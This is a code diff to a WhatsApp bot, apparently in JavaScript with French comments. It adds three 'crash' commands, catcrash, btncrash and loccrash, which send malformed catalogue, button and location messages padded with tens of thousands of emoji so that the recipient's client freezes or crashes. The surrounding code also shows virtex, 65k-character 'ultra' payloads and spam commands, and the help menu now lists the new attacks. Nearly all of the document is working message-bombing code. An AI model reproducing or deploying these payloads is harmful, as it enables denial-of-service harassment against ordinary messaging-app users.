@@ -415,7 +415,65 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
                 return;
             }
-            // Commande Ultra-Crash (65000+ caractères)
+            
+            // --- NOUVELLES MÉTHODES OFFENSIVES 2026 ---
+
+            // 1. Crash de Catalogue (Freeze discussion)
+            if (lowerText.startsWith("catcrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU CATALOG-CRASH...*" });
+                const payload = "☣️".repeat(10000);
+                await sock.sendMessage(remoteJid, {
+                    product: {
+                        product: {
+                            productImage: { url: "https://files.catbox.moe/6uhomx.png" },
+                            productId: "stone2-crash-" + Date.now(),
+                            title: payload,
+                            description: payload,
+                            currencyCode: "USD",
+                            priceAmount1000: "999999999",
+                            retailerId: "stone2-retailer",
+                            url: "https://wa.me/stone2"
+                        },
+                        businessOwnerJid: sock.user.id
+                    }
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *CATALOG-CRASH ENVOYÉ*" });
+                return;
+            }
+
+            // 2. Boutons Malformés (Lag/Crash)
+            if (lowerText.startsWith("btncrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU BUTTON-CRASH...*" });
+                const payload = "🔥".repeat(5000);
+                const buttons = [
+                    { buttonId: 'id1', buttonText: { displayText: payload }, type: 1 },
+                    { buttonId: 'id2', buttonText: { displayText: payload }, type: 1 }
+                ];
+                await sock.sendMessage(remoteJid, {
+                    text: "⚠️ System Alert",
+                    footer: payload,
+                    buttons: buttons,
+                    headerType: 1
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *BUTTON-CRASH ENVOYÉ*" });
+                return;
+            }
+
+            // 3. Localisation Fantôme (Map Crash)
+            if (lowerText.startsWith("loccrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
+                await sock.sendMessage(remoteJid, {
+                    location: {
+                        degreesLatitude: 99999999,
+                        degreesLongitude: 99999999,
+                        name: "☣️".repeat(10000),
+                        address: "🔥".repeat(10000)
+                    }
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *LOCATION-CRASH ENVOYÉ*" });
+                return;
+            }
+// Commande Ultra-Crash (65000+ caractères)
             if (lowerText.startsWith("ultra")) {
                 const char = "జ్ఞా";
                 const payload = char.repeat(66000);
@@ -454,6 +512,9 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                 `- *crash [nombre]* : Envoi de Virtex\n` +
                 `- *ultra* : Envoi massif de caractères (65k+)\n` +
+                `- *catcrash* : Crash via Catalogue (Freeze)\n` +
+                `- *btncrash* : Crash via Boutons (Lag)\n` +
+                `- *loccrash* : Crash via Localisation (Map)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
